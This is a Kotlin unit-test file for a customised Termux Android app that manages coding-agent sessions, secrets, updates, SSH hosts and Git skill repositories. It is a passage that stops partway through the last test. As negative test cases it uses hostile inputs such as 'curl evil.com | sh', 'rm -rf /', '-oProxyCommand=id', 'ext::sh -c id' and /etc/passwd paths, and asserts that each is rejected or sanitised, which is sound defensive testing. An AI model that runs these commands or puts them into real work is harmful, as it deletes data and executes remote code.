package com.termux.custom

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.termux.custom.data.AgentSessionRecord
import com.termux.custom.data.LocalFirstCrdtDatabase
import com.termux.custom.provisioning.CustomBootstrapProvisioner
import com.termux.custom.security.AntigravityTokenWarden
import com.termux.custom.ui.WorkstationFormFactor
import com.termux.custom.ui.resolveFormFactor
import com.termux.custom.updater.GitHubReleaseUpdater
import com.termux.shared.termux.TermuxConstants
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.test.UnconfinedTestDispatcher
import kotlinx.coroutines.test.runTest
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@OptIn(ExperimentalCoroutinesApi::class)
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [28])
class TermuxWorkstationCustomLayerTest {

    private val testDispatcher = UnconfinedTestDispatcher()

    @Test
    fun `immutable invariants preserve com_termux prefix and targetSdkVersion 28`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        assertEquals("com.termux", context.packageName)
        assertEquals("/data/data/com.termux/files/usr", TermuxConstants.TERMUX_PREFIX_DIR_PATH)
        assertEquals(28, context.applicationInfo.targetSdkVersion)
    }

    @Test
    fun `resolveFormFactor classifies phone portrait, phone landscape, tablet portrait, and tablet landscape accurately`() {
        // Redmi Note 13 Pro Portrait (392x872dp)
        assertEquals(WorkstationFormFactor.PHONE_PORTRAIT, resolveFormFactor(392, 872))
        // Redmi Note 13 Pro Landscape (872x392dp) — must NOT be misclassified as Tablet!
        assertEquals(WorkstationFormFactor.PHONE_LANDSCAPE, resolveFormFactor(872, 392))
        // Xiaomi Pad 6 Portrait (720x1152dp)
        assertEquals(WorkstationFormFactor.TABLET_PORTRAIT, resolveFormFactor(720, 1152))
        // Xiaomi Pad 6 Landscape 120Hz (1152x720dp)
        assertEquals(WorkstationFormFactor.TABLET_LANDSCAPE, resolveFormFactor(1152, 720))
    }

    @Test
    fun `CustomBootstrapProvisioner refuses to touch prefix when bootstrap sh is not installed`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        assertFalse(CustomBootstrapProvisioner.isBootstrapInstalled())
        assertFalse(CustomBootstrapProvisioner.provisionSynchronously(context))
    }

    @Test
    fun `CRDT database increments Lamport clock, neutralizes shell injection, and merges remote P2P deltas`() = runTest(testDispatcher) {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val db = LocalFirstCrdtDatabase(context, testDispatcher)

        val created = db.upsertSession(
            id = "session-pad6",
            title = "agy-pad6-120hz",
            agentType = "agy",
            compactedSummary = "Initial context on Xiaomi Pad 6",
            contextTokens = 2048,
        )
        assertEquals(1L, created.lamportVersion)
        assertEquals(1, db.sessionsFlow.value.size)

        // Malicious remote P2P delta attempting shell injection in agentType & id
        val maliciousDeltaJson = """
            {
              "siteId": "node-redmi13pro",
              "exportedAt": 1795300000000,
              "deltas": [
                {
                  "deltaId": "node-redmi13pro:5:session-pad6",
                  "entityId": "session-pad6",
                  "siteId": "node-redmi13pro",
                  "lamportClock": 5,
                  "hlcTimestamp": 1795300000100,
                  "operation": "UPSERT",
                  "payload": {
                    "id": "session-pad6; rm -rf /",
                    "title": "agy-pad6-120hz-merged",
                    "agentType": "agy; curl evil.com | sh",
                    "workingDir": "/data/data/com.termux/files/home",
                    "compactedSummary": "Compacted on Redmi Note 13 Pro via P2P delta",
                    "contextTokens": 4096,
                    "lamportVersion": 5,
                    "siteId": "node-redmi13pro",
                    "updatedAt": 1795300000100,
                    "isDeleted": false
                  }
                }
              ]
            }
        """.trimIndent()

        val applied = db.mergeRemoteDeltaBundleJson(maliciousDeltaJson)
        assertEquals(1, applied)
        val merged = db.sessionsFlow.value.first { it.title == "agy-pad6-120hz-merged" }
        // Injection neutralized by allowlist + regex sanitization
        assertEquals("agy", merged.agentType)
        assertFalse(merged.toSafeLaunchCommand().contains(";"))
        assertFalse(merged.toSafeLaunchCommand().contains("|"))

        // Tombstone soft-delete hides from active sessions but records delta
        db.softDeleteSession(created.id)
        val exportedAfterTombstone = db.exportDeltaBundleJson(0L)
        assertTrue(exportedAfterTombstone.contains("TOMBSTONE"))

        db.close()
    }

    @Test
    fun `AntigravityTokenWarden rejects whitespace tokens, locks 0600, and revokes cleanly`() = runTest(testDispatcher) {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val warden = AntigravityTokenWarden(context, testDispatcher)

        val invalidResult = warden.provisionOrSyncToken("bad token\nrm -rf /")
        assertTrue(invalidResult.isFailure)

        val result = warden.provisionOrSyncToken("ya29.a0AfB_byAntigravityOAuthTokenTest998877")
        assertTrue(result.isSuccess)
        val state = result.getOrThrow()
        assertTrue(state.isPresent)
        assertEquals("0600", state.posixModeOctal)
        assertTrue(state.maskedPreview.startsWith("ya29"))

        val revoked = warden.revokeLocalToken()
        assertFalse(revoked.isPresent)
    }

    @Test
    fun `AgentSessionRecord allowlists launch command against injection`() {
        val record = AgentSessionRecord(
            id = "abc;whoami",
            title = "test",
            agentType = "rm -rf /",
            workingDir = "/tmp",
            compactedSummary = "",
            contextTokens = 0,
            lamportVersion = 1L,
            siteId = "node-1",
            updatedAt = 0L,
            isDeleted = false,
        )
        assertEquals("agy --resume abcwhoami", record.toSafeLaunchCommand())
    }

    @Test
    fun `GitHubReleaseUpdater compares melcat tags accurately and resolves ABI-specific APK`() {
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.4"))
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.9", "v0.119.0-melcat.1"))
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.11", "v1.0"))
        assertTrue(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v1.0", "v1.1"))
        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v1.0", "v1.0"))
        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.3", "v0.118.0-melcat.3"))
        assertFalse(com.termux.custom.updater.GitHubReleaseUpdater.isRemoteTagNewer("v0.118.0-melcat.4", "v0.118.0-melcat.3"))

        val releaseJson = """
            {
              "tag_name": "v0.118.0-melcat.4",
              "name": "v0.118.0-melcat.4 — OTA Test",
              "body": "Auto update test",
              "html_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/tag/v0.118.0-melcat.4",
              "assets": []
            }
        """.trimIndent()
        val parsed = com.termux.custom.updater.GitHubReleaseUpdater.parseLatestReleaseJson(
            releaseJson,
            listOf("arm64-v8a", "armeabi-v7a"),
        )
        assertEquals("v0.118.0-melcat.4", parsed.tagName)
        assertEquals("arm64-v8a", parsed.matchedAbi)
        assertTrue(parsed.apkDownloadUrl.contains("v0.118.0-melcat.4"))
        assertTrue(parsed.sha256Url!!.endsWith(".sha256"))

        // Verify direct GitHub Actions signed release assets are matched cleanly
        val signedReleaseJson = """
            {
              "tag_name": "v1.1",
              "name": "v1.1",
              "body": "Signed release",
              "html_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/tag/v1.1",
              "assets": [
                {
                  "name": "termux-app_apt-android-7-release_universal.apk",
                  "browser_download_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/download/v1.1/termux-app_apt-android-7-release_universal.apk"
                },
                {
                  "name": "termux-app_apt-android-7-release_arm64-v8a.apk",
                  "browser_download_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/download/v1.1/termux-app_apt-android-7-release_arm64-v8a.apk"
                },
                {
                  "name": "termux-app_apt-android-7-release_arm64-v8a.apk.sha256",
                  "browser_download_url": "https://github.com/ing-melcat/Terminal-Agents-Builder/releases/download/v1.1/termux-app_apt-android-7-release_arm64-v8a.apk.sha256"
                }
              ]
            }
        """.trimIndent()
        val parsedSigned = com.termux.custom.updater.GitHubReleaseUpdater.parseLatestReleaseJson(
            signedReleaseJson,
            listOf("arm64-v8a", "armeabi-v7a"),
        )
        assertEquals("v1.1", parsedSigned.tagName)
        assertEquals("arm64-v8a", parsedSigned.matchedAbi)
        assertTrue(parsedSigned.apkDownloadUrl.endsWith("release_arm64-v8a.apk"))
        assertTrue(parsedSigned.sha256Url!!.endsWith("release_arm64-v8a.apk.sha256"))
    }

    @Test
    fun tutorialProgressStorePersistsValidStepsAndAutoOffer() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val store = com.termux.custom.ui.TutorialProgressStore
        store.reset(context)

        assertTrue(store.shouldAutoOffer(context))
        assertEquals(0f, store.computeProgressFraction(emptySet()), 0.0001f)

        val filtered = store.filterValidIds(setOf("arm64_engine_setup", "bogus_step_id"))
        assertEquals(setOf("arm64_engine_setup"), filtered)

        val afterFirst = store.setStepCompleted(context, com.termux.custom.ui.TutorialStep.ARM64_ENGINE_SETUP, true)
        assertEquals(setOf("arm64_engine_setup"), afterFirst)
        assertEquals(1f / com.termux.custom.ui.TutorialStep.entries.size, store.computeProgressFraction(afterFirst), 0.0001f)

        store.setAutoOffered(context, true)
        assertFalse(store.shouldAutoOffer(context))

        val reloaded = store.loadCompletedIds(context)
        assertEquals(setOf("arm64_engine_setup"), reloaded)

        val afterUncheck = store.setStepCompleted(context, com.termux.custom.ui.TutorialStep.ARM64_ENGINE_SETUP, false)
        assertTrue(afterUncheck.isEmpty())
    }

    @Test
    fun shieldScoreAlignsWithFiveChecklistItems() {
        val baseGuardian = com.termux.custom.guardian.GuardianStatus(
            isServiceRunning = true,
            wakeLockHeld = true,
            wifiLockHeld = true,
            batteryOptimizationIgnored = true,
            isHyperOsOrMiui = true,
            maxPhantomProcesses = "2147483647",
            adbPhantomFixCommand = "adb shell ...",
        )
        val missingToken = com.termux.custom.security.OAuthTokenState(
            isPresent = false,
            maskedPreview = "Not configured",
            fingerprintSha256 = "none",
            posixModeOctal = "----",
            storagePath = "",
            syncedCliTargets = emptyList(),
        )
        // Missing OAuth token must NOT reach 100% even if phantomShielded is true
        assertEquals(80, com.termux.custom.ui.computeShieldScore(true, baseGuardian, missingToken))

        val activeToken = missingToken.copy(isPresent = true, posixModeOctal = "0600")
        assertEquals(100, com.termux.custom.ui.computeShieldScore(true, baseGuardian, activeToken))
    }

    @Test
    fun `CodingAgentsManager enforces 0600 vault, zero plaintext secrets in opencode_json, and preserves user config`() = runTest(testDispatcher) {
        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-coding-agents-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val manager = com.termux.custom.agents.CodingAgentsManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
            )

            // Seed pre-existing user config inside opencode.json with JSONC trailing comma (must be preserved!)
            val opencodeDir = java.io.File(homeDir, ".config/opencode").apply { mkdirs() }
            val opencodeJson = java.io.File(opencodeDir, "opencode.json")
            opencodeJson.writeText("""{"instructions":["AGENTS.md",],"snapshots":true,}""")

            // Reject invalid whitespace API key
            val badKey = manager.saveProviderApiKey(
                com.termux.custom.agents.CodingProvider.OPENROUTER,
                "sk-or-v1 bad\nrm -rf /",
            )
            assertTrue(badKey.isFailure)

            // Save valid OpenRouter API key
            val secret = "sk-or-v1-testsecret998877665544332211"
            val saved = manager.saveProviderApiKey(
                com.termux.custom.agents.CodingProvider.OPENROUTER,
                secret,
            ).getOrThrow()

            val orStatus = saved.providerStatuses[com.termux.custom.agents.CodingProvider.OPENROUTER]!!
            assertTrue(orStatus.isConfigured)
            assertEquals("0600", orStatus.posixModeOctal)

            // Verify zero plaintext secret inside opencode.json, zero '\/' escaping, and user fields preserved
            val rawConfig = opencodeJson.readText()
            assertFalse("Plaintext secret must NEVER appear in opencode.json", rawConfig.contains(secret))
            assertFalse("org.json escaped slashes must be cleaned", rawConfig.contains("\\/"))
            assertTrue(rawConfig.contains("{file:~/.config/melcat/vault/openrouter.key}"))
            assertTrue(rawConfig.contains("AGENTS.md"))

            // Verify cli.json Termux touch-keyboard keybind seeded cleanly without escaped slashes
            val cliJson = java.io.File(opencodeDir, "cli.json")
            assertTrue(cliJson.isFile)
            assertTrue(cliJson.readText().contains("\"agent.cycle\": \"tab\""))
            assertFalse(cliJson.readText().contains("\\/"))

            // Select coding-only model preset
            val qwenNext = com.termux.custom.agents.CodingModelCatalog.findById("openrouter/qwen/qwen3-coder-next")!!
            val afterSelect = manager.selectCodingModel(qwenNext).getOrThrow()
            assertEquals("openrouter/qwen/qwen3-coder-next", afterSelect.activeOpenCodeModel)

            // Ollama LAN URL normalization + injection/credentials/query/port rejection
            assertTrue(manager.saveOllamaBaseUrl("http://192.168.1.50:11434;whoami").isFailure)
            assertTrue(manager.saveOllamaBaseUrl("file:///etc/passwd").isFailure)
            assertTrue(manager.saveOllamaBaseUrl("http://user:secret@192.168.1.50:11434/v1").isFailure)
            assertTrue(manager.saveOllamaBaseUrl("http://192.168.1.50:11434/v1?foo=bar").isFailure)
            assertTrue(manager.saveOllamaBaseUrl("http://192.168.1.50:99999/v1").isFailure)
            val afterOllama = manager.saveOllamaBaseUrl("http://192.168.1.50:11434").getOrThrow()
            assertEquals("http://192.168.1.50:11434/v1", afterOllama.ollamaBaseUrl)

            // Clear API key wipes secret cleanly
            val afterClear = manager.clearProviderApiKey(com.termux.custom.agents.CodingProvider.OPENROUTER)
            assertFalse(afterClear.providerStatuses[com.termux.custom.agents.CodingProvider.OPENROUTER]!!.isConfigured)
            assertFalse(java.io.File(homeDir, ".config/melcat/vault/openrouter.key").exists())

            // Corrupt opencode.json must NOT be silently wiped on mutation
            opencodeJson.writeText("{ broken json")
            val failOnCorrupt = manager.selectCodingModel(qwenNext)
            assertTrue(failOnCorrupt.isFailure)
            assertEquals("{ broken json", opencodeJson.readText())

            // Verify binary detection for agy (requires agy + agy.va39) and opencode
            val binDir = java.io.File(prefixDir, "bin").apply { mkdirs() }
            java.io.File(binDir, "opencode").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            val detected = manager.inspectState()
            assertFalse(detected.agyInstalled)
            assertTrue(detected.opencodeInstalled)
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `CodingModelCatalog covers Free, Local, Budget, and Pro coding tiers and opencode is CRDT-allowlisted`() {
        val tiers = com.termux.custom.agents.CodingModelCatalog.presets.map { it.tier }.toSet()
        assertTrue(com.termux.custom.agents.CodingBudgetTier.FREE in tiers)
        assertTrue(com.termux.custom.agents.CodingBudgetTier.LOCAL in tiers)
        assertTrue(com.termux.custom.agents.CodingBudgetTier.BUDGET in tiers)
        assertTrue(com.termux.custom.agents.CodingBudgetTier.PRO in tiers)
        assertTrue(com.termux.custom.agents.CodingModelCatalog.presets.all { it.id.contains("/") })

        val ocRecord = AgentSessionRecord(
            id = "sess-oc",
            title = "OpenCode Session",
            agentType = "opencode",
            workingDir = "/data/data/com.termux/files/home",
            compactedSummary = "Coding agent",
            contextTokens = 0,
            lamportVersion = 1L,
            siteId = "node-1",
            updatedAt = 0L,
            isDeleted = false,
        )
        assertEquals("opencode", ocRecord.toSafeLaunchCommand())
    }

    @Test
    fun `SshDevicesManager validates hosts, detects Tailscale ranges, parses ssh_config, probes reachability, and builds safe execve argv`() = runTest(testDispatcher) {
        // 1. Tailscale CGNAT (100.64.0.0/10) & MagicDNS (*.ts.net) detection
        assertTrue(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("100.64.0.1"))
        assertTrue(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("100.100.100.100"))
        assertTrue(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("100.127.255.254"))
        assertTrue(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("jetson-orin.tail1234.ts.net"))
        assertFalse(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("100.63.255.255"))
        assertFalse(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("100.128.0.1"))
        assertFalse(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("192.168.1.40"))
        assertFalse(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("example.com"))

        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-ssh-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val binDir = java.io.File(prefixDir, "bin").apply { mkdirs() }
            java.io.File(binDir, "ssh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "sh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }

            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val sshDir = java.io.File(homeDir, ".ssh").apply { mkdirs() }
            java.io.File(sshDir, "id_ed25519.pub").writeText("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITestKey rur-workstation\n")
            java.io.File(sshDir, "config").writeText(
                """
                # Wildcard entry must be skipped
                Host *
                    ServerAliveInterval 60

                Host jetson-ts
                    HostName 100.64.12.8
                    User robotuser
                    Port 2222
                    IdentityFile ~/.ssh/id_ed25519

                Host rogue-key
                    HostName 192.168.1.99
                    User pi
                    IdentityFile /tmp/outside_key
                """.trimIndent()
            )

            var simulatedTailscaleIp: String? = null
            val simulatedLatencies = mutableMapOf<String, Long?>(
                "192.168.1.40:22" to 24L,
                "192.168.1.99:22" to null,
                "100.64.12.8:2222" to null,
            )

            val manager = com.termux.custom.ssh.SshDevicesManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
                tcpProber = { host, port, _ -> simulatedLatencies["$host:$port"] },
                tailscaleIpDetector = { simulatedTailscaleIp },
            )

            // 2. Strict allowlist validation rejects option injection, shell metacharacters, path traversal, and invalid ports
            assertTrue(manager.upsertDevice(null, "Evil", "-oProxyCommand=id", 22, "u", com.termux.custom.ssh.SshTransport.DIRECT, "", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1;rm -rf /", 22, "u", com.termux.custom.ssh.SshTransport.DIRECT, "", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1", 0, "u", com.termux.custom.ssh.SshTransport.DIRECT, "", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1", 70000, "u", com.termux.custom.ssh.SshTransport.DIRECT, "", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1", 22, "-root", com.termux.custom.ssh.SshTransport.DIRECT, "", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1", 22, "u", com.termux.custom.ssh.SshTransport.DIRECT, "../id_rsa", "").isFailure)
            assertTrue(manager.upsertDevice(null, "Evil", "192.168.1.1", 22, "u", com.termux.custom.ssh.SshTransport.DIRECT, "/etc/passwd", "").isFailure)

            // 3. Save valid Direct LAN host & verify persistence + ~/.ssh/config auto-discovery
            val afterSave = manager.upsertDevice(
                id = null,
                name = "Lab PC",
                host = "192.168.1.40",
                port = 22,
                username = "ubuntu",
                transport = com.termux.custom.ssh.SshTransport.DIRECT,
                identityFile = "id_ed25519",
                tags = "ROS2",
            ).getOrThrow()

            assertTrue(afterSave.opensshInstalled)
            assertEquals("id_ed25519.pub", afterSave.defaultPublicKeyName)
            assertEquals(3, afterSave.devices.size) // Lab PC + jetson-ts + rogue-key (Host * skipped)

            val jetson = afterSave.devices.first { it.name == "jetson-ts" }
            assertEquals(com.termux.custom.ssh.SshTransport.TAILSCALE, jetson.transport)
            assertEquals(com.termux.custom.ssh.SshDeviceSource.SSH_CONFIG, jetson.source)
            assertEquals("id_ed25519", jetson.identityFile)

            val rogueKeyHost = afterSave.devices.first { it.name == "rogue-key" }
            assertEquals("", rogueKeyHost.identityFile) // outside ~/.ssh/ must be ignored

            // 4. Probe with Tailscale OFF -> Lab PC ONLINE (sorted 1st), jetson-ts NEEDS_TAILSCALE, rogue-key OFFLINE
            val probedOff = manager.probeAllDevices(afterSave)
            assertFalse(probedOff.isTailscaleActive)
            assertEquals(1, probedOff.onlineCount)
            assertEquals("Lab PC", probedOff.sortedDevices.first().name)
            assertEquals(com.termux.custom.ssh.SshReachability.ONLINE, probedOff.probes[afterSave.devices.first { it.name == "Lab PC" }.id]?.reachability)
            assertEquals(com.termux.custom.ssh.SshReachability.NEEDS_TAILSCALE, probedOff.probes[jetson.id]?.reachability)
            assertEquals(com.termux.custom.ssh.SshReachability.OFFLINE, probedOff.probes[rogueKeyHost.id]?.reachability)

            // 5. Probe with Tailscale ON and jetson-ts responding at 8ms -> jetson-ts sorts ahead of 24ms Lab PC
            simulatedTailscaleIp = "100.64.0.99"
            simulatedLatencies["100.64.12.8:2222"] = 8L
            val probedOn = manager.probeAllDevices(probedOff)
            assertTrue(probedOn.isTailscaleActive)
            assertEquals(2, probedOn.onlineCount)
            assertEquals("jetson-ts", probedOn.sortedDevices[0].name)
            assertEquals("Lab PC", probedOn.sortedDevices[1].name)

            // 6. Verify injection-proof OS execve argv (`--` before host, zero user input interpolated into sh script)
            val sshArgv = manager.buildSshArgv(jetson)
            val ddIndex = sshArgv.indexOf("--")
            assertTrue(ddIndex > 0)
            assertEquals("100.64.12.8", sshArgv[ddIndex + 1])
            assertTrue(sshArgv.contains("-l") && sshArgv.contains("robotuser"))
            assertTrue(sshArgv.contains("-p") && sshArgv.contains("2222"))

            val (shBin, ptyArgv) = manager.buildPtySessionExec(jetson)
            assertTrue(shBin.endsWith("/bin/sh"))
            assertEquals("-c", ptyArgv[0])
            assertFalse("User host must not be interpolated into sh script body", ptyArgv[1].contains("100.64.12.8"))
            assertFalse("User name must not be interpolated into sh script body", ptyArgv[1].contains("robotuser"))
            assertEquals("rur-ssh", ptyArgv[2])
            assertEquals("100.64.12.8", ptyArgv.last())

            // 7. Corrupt ssh-devices.json must NOT be silently overwritten on mutation
            val devicesJson = java.io.File(homeDir, ".config/melcat/ssh-devices.json")
            assertTrue(devicesJson.isFile)
            devicesJson.writeText("{ broken json")
            val failMutate = manager.deleteDevice(afterSave.devices.first { it.name == "Lab PC" }.id)
            assertTrue(failMutate.isFailure)
            assertEquals("{ broken json", devicesJson.readText())
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `SshDevicesManager guards duplicate IDs, Match blocks, symlinked IdentityFile, IPv6, ESC escape sequences, and cancellation`() = runTest(testDispatcher) {
        // IPv6 Tailscale ULA & compressed IPv6 validation + bracketed display
        assertTrue(com.termux.custom.ssh.SshDevicesManager.looksLikeTailscaleHost("fd7a:115c:a1e0::42"))
        val ipv6Rec = com.termux.custom.ssh.SshDevicesManager.validateRecord(
            id = "ipv6-1",
            name = "Loop\u001B]52;c;ZXZpbA==\u0007Node",
            host = "::1",
            port = 2222,
            username = "root",
            transport = com.termux.custom.ssh.SshTransport.DIRECT,
            identityFile = "",
            tags = "",
        )
        assertEquals("root@[::1]:2222", ipv6Rec.targetDisplay)
        assertFalse("ISO control / ESC must be stripped from name", ipv6Rec.name.contains('\u001B'))
        assertFalse("BEL must be stripped from name", ipv6Rec.name.contains('\u0007'))

        val tempRoot = java.nio.file.Files.createTempDirectory("melcat-ssh-audit-test").toFile()
        try {
            val prefixDir = java.io.File(tempRoot, "usr").apply { mkdirs() }
            val binDir = java.io.File(prefixDir, "bin").apply { mkdirs() }
            java.io.File(binDir, "ssh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "sh").apply { writeText("#!/bin/sh\n"); setExecutable(true) }
            java.io.File(binDir, "login").apply { writeText("#!/bin/sh\n"); setExecutable(true) }

            val homeDir = java.io.File(tempRoot, "home").apply { mkdirs() }
            val sshDir = java.io.File(homeDir, ".ssh").apply { mkdirs() }
            val melcatDir = java.io.File(homeDir, ".config/melcat").apply { mkdirs() }

            // Outside secret + symlink inside ~/.ssh/ pointing to it
            val outsideKey = java.io.File(tempRoot, "secret_outside_key").apply { writeText("SECRET") }
            val symlinkKey = java.io.File(sshDir, "evil_link")
            java.nio.file.Files.createSymbolicLink(symlinkKey.toPath(), outsideKey.toPath())

            // ~/.ssh/config with duplicate stanzas (first-match-wins), multi-alias Host, Match block, and symlinked IdentityFile
            java.io.File(sshDir, "config").writeText(
                """
                Host lab-a lab-b
                    HostName 192.168.10.5
                    User firstuser
                    Port 2200
                    IdentityFile ~/.ssh/evil_link

                Host lab-a
                    HostName 192.168.10.99
                    User seconduser
                    Port 2299

                Match host *
                    User matchoverride
                    HostName 10.0.0.1
                """.trimIndent()
            )

            // Hand-edited ssh-devices.json with duplicate IDs (must be deduplicated so LazyColumn never crashes!)
            java.io.File(melcatDir, "ssh-devices.json").writeText(
                """
                {
                  "version": 1,
                  "devices": [
                    {"id": "dup-id", "name": "Node 1", "host": "192.168.1.10", "port": 22, "username": "pi", "transport": "DIRECT"},
                    {"id": "dup-id", "name": "Node 2", "host": "192.168.1.11", "port": 22, "username": "pi", "transport": "DIRECT"}
                  ]
                }
                """.trimIndent()
            )

            val probedHosts = mutableListOf<String>()
            val manager = com.termux.custom.ssh.SshDevicesManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
                tcpProber = { host, _, _ ->
                    probedHosts.add(host)
                    10L
                },
                tailscaleIpDetector = { null },
            )

            val state = manager.inspectEnvironmentAndDevices()
            // Every device ID must be strictly unique (zero Compose LazyColumn duplicate key crashes)
            assertEquals(state.devices.size, state.devices.map { it.id }.toSet().size)

            // Duplicate stanza for lab-a merged with OpenSSH first-match-wins and NOT overwritten by Match block
            val labA = state.devices.first { it.name == "lab-a" }
            assertEquals("192.168.10.5", labA.host)
            assertEquals("firstuser", labA.username)
            assertEquals(2200, labA.port)
            assertEquals("", labA.identityFile) // symlink escape rejected!

            // Unvalidated raw device passed directly to buildPtySessionExec must still strip ESC sequences
            val (_, ptyArgv) = manager.buildPtySessionExec(
                com.termux.custom.ssh.SshDeviceRecord(
                    id = "raw",
                    name = "Bad\u001B[31mName",
                    host = "192.168.1.10",
                    port = 22,
                    username = "pi",
                )
            )
            assertFalse("ESC must be stripped from label argv", ptyArgv[3].contains('\u001B'))
            assertTrue("Wrapper script must be static with zero prefix path interpolation", !ptyArgv[1].contains(tempRoot.name))

            // Tailscale host MUST NOT even invoke tcpProber when Tailscale VPN is inactive (avoids DNS stalls)
            val tsSaved = manager.upsertDevice(
                null, "TS Box", "jetson.tail999.ts.net", 22, "jetson",
                com.termux.custom.ssh.SshTransport.TAILSCALE, "", "",
            ).getOrThrow()
            probedHosts.clear()
            val probed = manager.probeAllDevices(tsSaved)
            assertFalse("Tailscale host must skip TCP/DNS probe when VPN is off", "jetson.tail999.ts.net" in probedHosts)
            val tsDev = probed.devices.first { it.name == "TS Box" }
            assertEquals(com.termux.custom.ssh.SshReachability.NEEDS_TAILSCALE, probed.probes[tsDev.id]?.reachability)

            // CancellationException must propagate out of probeAllDevices (never swallowed)
            val cancellingManager = com.termux.custom.ssh.SshDevicesManager(
                prefixDir = prefixDir,
                homeDir = homeDir,
                ioDispatcher = testDispatcher,
                tcpProber = { _, _, _ -> throw kotlinx.coroutines.CancellationException("cancelled") },
                tailscaleIpDetector = { "100.64.0.1" },
            )
            var caughtCancel = false
            try {
                cancellingManager.probeAllDevices(tsSaved)
            } catch (_: kotlinx.coroutines.CancellationException) {
                caughtCancel = true
            }
            assertTrue("CancellationException must not be swallowed by probeAllDevices", caughtCancel)
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun `SkillsRepoManager validates Git URLs and names strictly, inspects Git skill repos, and builds static zero-interpolation PTY execve`() = runTest(testDispatcher) {
        // 1. Strict URL allowlist blocks option injection, ext::, file://, plaintext http://, embedded passwords, dash hosts/paths, pathless URLs, traversal, and whitespace
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("-u./evil").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("ext::sh -c id").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("file:///etc/passwd").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("http://github.com/a/b.git").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://user:secret@github.com/a/b.git").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://github.com").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("git@-oProxyCommand:a/b").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("git@github.com:-foo").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("ssh://-F/etc/hosts/repo").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://github.com/a/b;rm -rf /").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://github.com/a/b\nwhoami").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://github.com/a/../b").isFailure)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("https://github.com/ing-melcat/skills.git").isSuccess)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("git@github.com:ing-melcat/skills.git").isSuccess)
        assertTrue(com.termux.custom.skills.SkillsRepoManager.validateGitUrl("ssh://git@github.com/ing-melcat/skills.git").isSuccess)

        // 2. Strict folder name allowlist blocks path traversal, leading dash, slashes, and spaces
